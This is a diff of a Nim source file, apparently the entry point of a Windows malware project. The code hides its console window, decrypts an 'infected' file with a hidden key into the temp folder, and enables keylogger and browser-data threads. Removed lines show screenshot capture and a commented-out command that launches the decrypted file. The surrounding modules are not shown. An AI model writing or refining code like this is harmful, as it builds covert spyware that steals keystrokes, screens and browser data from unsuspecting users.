@@ -1,46 +1,47 @@
-import lib/more/xxtea
-from os import commandLineParams
+# hide the console window
+from lib/constants import isProd
+
+when isProd:
+  from winim/inc/wincon import FreeConsole
+  FreeConsole()
+
+# decrypt file if args passed
+from os import paramCount
+from os import paramStr
 from os import getEnv
 from os import `/`
 from os import splitFile
-from os import execShellCmd
+from os import existsFile
+
+
+from lib/more/xxtea import decrypt
+from lib/functions/hideString import d
+
 from lib/flags import INFECT_ENCRYPTION_KEY
-from winim/inc/wincon import FreeConsole
 
-FreeConsole()
-
-let params: seq[string] = commandLineParams()
-
-if params.len >= 1 and params[0] != "":
+if paramCount() >= 1:
   try:
-    let filePath: string = params[0]
-    let input = readFile(filePath)
+    let file = paramStr(1)
+    let (_, name, ext) = splitFile(file)
+    let tmpFile = getEnv("tmp") / name & ext
 
-    let decrypted = xxtea.decrypt(input, INFECT_ENCRYPTION_KEY)
+    if not existsFile(tmpFile):
+      writeFile(
+        tmpFile,
+        decrypt(
+          readFile(file),
+          d INFECT_ENCRYPTION_KEY
+        )
+      )
 
-    let (_, name, ext) = splitFile(filePath)
+    quit 0
+  except OSError, IOError:
+    quit 0
 
-    let tmpPath = getEnv("tmp") / name & ext
-
-    writeFile(tmpPath, decrypted)
-
-    quit(0)
-  except OSError:
-    quit(0)
-
-
-
-  # discard execShellCmd("start \"\" " & tmpPath)
-
-import asyncdispatch
 from os import sleep
-
-import lib/functions/getWindowName
-import lib/functions/screenshot
 
 from lib/channels import mainThread
 
-from lib/constants import isProd
 
 from lib/flags import USE_BROWSER_THREAD
 from lib/flags import USE_KEYLOGGER_THREAD
@@ -52,10 +53,6 @@ when isProd:
 
 when not isProd:
   echo "started"
-
-let base64Ss: string = screenshot()
-
-# writeFile("base64.tmp.txt", base64Ss)
 
 open mainThread
 
@@ -95,13 +92,3 @@ while true:
 
   if channel.dataAvailable:
     echo channel.msg
-
-# proc main() {.async.} =
-#   echo getWindowName()
-#   await sleepAsync(1000)
-#   asyncCheck main()
-
-# asyncCheck main()
-
-# runForever()
-
